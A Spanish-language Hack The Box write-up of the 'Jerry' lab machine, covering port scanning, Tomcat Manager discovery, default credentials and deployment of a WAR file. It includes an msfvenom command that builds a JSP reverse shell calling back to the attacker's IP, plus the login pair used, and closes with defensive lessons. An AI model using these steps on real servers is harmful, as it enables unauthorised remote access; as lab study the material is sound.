
---

---
![[70ad20fb2cdb28b15a8b7849fc1cf908.png]]
### 🧩 Tarea 1 - ¿Qué puerto TCP está abierto en el host remoto?

📌 Comando ejecutado:

```bash
sudo nmap -sS -sV -p- 10.10.10.95
```

🔎 Resultado:

![[220ce129ee7d1e70c02f49a035eb7e05.png]]

✅ **Puerto abierto:** `8080`


### 🌐 Tarea 2 - ¿Qué servidor web se está ejecutando en el host remoto?

🛰️ Detectado en el escaneo anterior:

```bash
Apache Tomcat/Coyote JSP engine 1.1
```

✅ **Servidor web:** `Apache Tomcat`

### 📂 Tarea 3 - ¿Qué ruta relativa lleva al Web Application Manager?

🧭 Según Tomcat, las rutas comunes suelen ser:

- `/manager/html` → Web Application Manager (GUI)
    
- `/host-manager/html` → Host Manager
    

📂 Enumeramos con `gobuster`:

```bash
gobuster dir -u http://jerry.htb:8080/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 50 -x php,txt,html
```

![[382182e784484d5b1b2fde5e98827da6.png]]

📁 Rutas descubiertas:

- `/docs` (302)
    
- `/examples` (302)
    
- `/manager` (302)
    

🔑 Al visitar `http://jerry.htb:8080/manager` se redirige a `http://jerry.htb:8080/manager/html` donde aparece el **Tomcat Web Application Manager**.

![[7d74ccb08602ff1c0f94f4d98352f00e.png]]

![[6bff258c17408955f4cb218f10757dc1.png]]

✅ **Ruta relativa correcta:** `/manager/html`

### 🔐 Tarea 4 - ¿Qué credenciales se utilizan para acceder al Manager?

📸 Como muestra la captura anterior:

- Se solicita usuario y contraseña vía autenticación básica HTTP.
    
- Acceder directamente a `/manager/html` da un **401 Unauthorized**.
    
- En la página aparece una pista:

![[9753078ad68776e1b0ad622a9bb60a7f.png]]

✳️ Este es un ejemplo típico de credenciales **por defecto** en Apache Tomcat 7.x, y muchas veces siguen activas en entornos vulnerables.


### 🗂️ Tarea 5 - ¿Qué tipo de archivo puede subirse y desplegarse mediante el Tomcat Web Application Manager?

📌 Desde la interfaz del manager (`/manager/html`), puedes:

- Especificar un WAR ya existente en el servidor (campo _WAR or Directory URL_).
    
- O bien, **subir tu propio archivo `.war`** y desplegarlo directamente con el botón **Browse → Deploy**.

![[ea0e87d009c1a95efe98930af5fdd721.png]]

✅ **Tipo de archivo permitido:** `.war`

## 🧩 Tarea 6 - Obtener una reverse shell y encontrar la flag 🏁

### ⚙️ Objetivo

Desplegar un payload `.war` en el **Apache Tomcat Manager** para conseguir acceso remoto y buscar la flag final del sistema 🕵️‍♂️

### 🧪 Paso 1: Generar el `.war` con `msfvenom`

Creamos una **reverse shell compatible con Tomcat** (basada en JSP):

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.14 LPORT=4444 -f war -o shell5.war
```

![[396ce6e9ddf75c1f4e17efc8f53e2475.png]]

🔹 `LHOST` = nuestra IP tun0  
🔹 `LPORT` = puerto en el que escucharemos  
🔹 `-f war` = formato compatible con Tomcat  
🔹 `-o shell5.war` = nombre del archivo generado

📦 **Payload generado con éxito**: `shell5.war` ✅  
📏 Tamaño: 1079 bytes  
📍 Ubicado en nuestro sistema para subirlo después.


---

### 🧪 Paso 2: Subir el `.war` al Tomcat Web Application Manager

📍 Accedemos a:

```bash
http://jerry.htb:8080/manager/html
```

➡️ Vamos a la sección:

![[dacf4e58e85d32156ab4f49e6c820d40.png]]

🟢 **Resultado:**

![[aebd0f1eea899ec7f360a135c800e722.png]]

📦 Tomcat ha desplegado correctamente la aplicación `/shell5`.

### 🧲 Paso 3: Abrimos listener en Netcat

En otra terminal:

![[ead4955492c464ef3dc9a1aed6161e2b.png]]

Esperamos la conexión...

### 🧨 Paso 4: Disparamos la shell en el navegador

📎 Visitamos:

```bash
http://jerry.htb:8080/shell5/
```

![[edbffaa7e62d5073adb67c35523afafe.png]]

✅ Boom 💥 ¡Reverse shell establecida!

![[e80e6047c5eb6d104da30a5e1d979144 1.png]]

### 🔍 Paso 5: Buscar la flag

📂 Navegamos hasta:

![[7bb4b953288465cc53b72693eca6a567.png]]

¡Típico troleo de Hack The Box! La flag es literal 🤣.

## 🧠 Análisis y conclusión final - Máquina _Jerry_ (HTB)

---

### 📝 Resumen de la explotación

La máquina **Jerry** representa una configuración vulnerable clásica de un servidor **Apache Tomcat** con credenciales por defecto y sin restricciones en el despliegue de archivos `.war`.

🔍 Desde el inicio, la única pista fue el puerto **8080** expuesto. A través de escaneo con `nmap` y `gobuster`, descubrimos el panel de administración de Tomcat en:

```bash
http://jerry.htb:8080/manager/html
```

Una vez allí, usamos credenciales por defecto (`tomcat:s3cret`) y aprovechamos la funcionalidad de **subida y despliegue de archivos `.war`** para lanzar una **reverse shell basada en JSP**, lo que nos permitió ejecutar comandos como **NT AUTHORITY\SYSTEM**.

Finalmente, localizamos la _flag_ en el escritorio del administrador.

---

### 🧩 Vector de ataque

| Etapa                      | Detalle                                                   |
| -------------------------- | --------------------------------------------------------- |
| 🔎 Reconocimiento          | Puerto 8080 expone Tomcat 7.0.88                          |
| 🔐 Acceso con credenciales | `tomcat:s3cret` (por defecto)                             |
| 💣 Upload de `.war`        | Subida del payload `jsp_shell_reverse_tcp` con `msfvenom` |
| 💻 Reverse shell           | Netcat escucha y captura conexión desde `jerry.htb`       |
| 📂 Exploración del sistema | Flag ubicada en `C:\Users\Administrator\Desktop\flags\`   |

### 🚩 Claves de la máquina

- ✅ **Nivel adecuado para principiantes**, ideal para entender cómo funciona Tomcat internamente.
    
- 🛠️ **No requiere exploits avanzados**, solo buen reconocimiento y lógica.
    
- 🚨 Refuerza conceptos esenciales:
    
    - No dejar credenciales por defecto.
        
    - No permitir despliegue remoto sin autenticación fuerte.
        
    - La importancia del _principio de mínimos privilegios_.
        

---

### 📌 Lecciones aprendidas

- El acceso a Tomcat Manager sin restricciones es **crítico**.
    
- Usar `msfvenom` con el payload adecuado para cada contexto (JSP para Tomcat, no `.exe`).
    
- Saber interpretar el despliegue de aplicaciones Java en contexto `.war`.
    

---

### 📘 Nivel personal

Esta máquina fue sencilla pero **muy didáctica**, perfecta para afianzar el uso de `.war` en entornos Windows y reforzar habilidades básicas de pentesting web.

El detalle troll de la flag (`type 2 for the price of 1`) le da un toque HTB clásico 🧃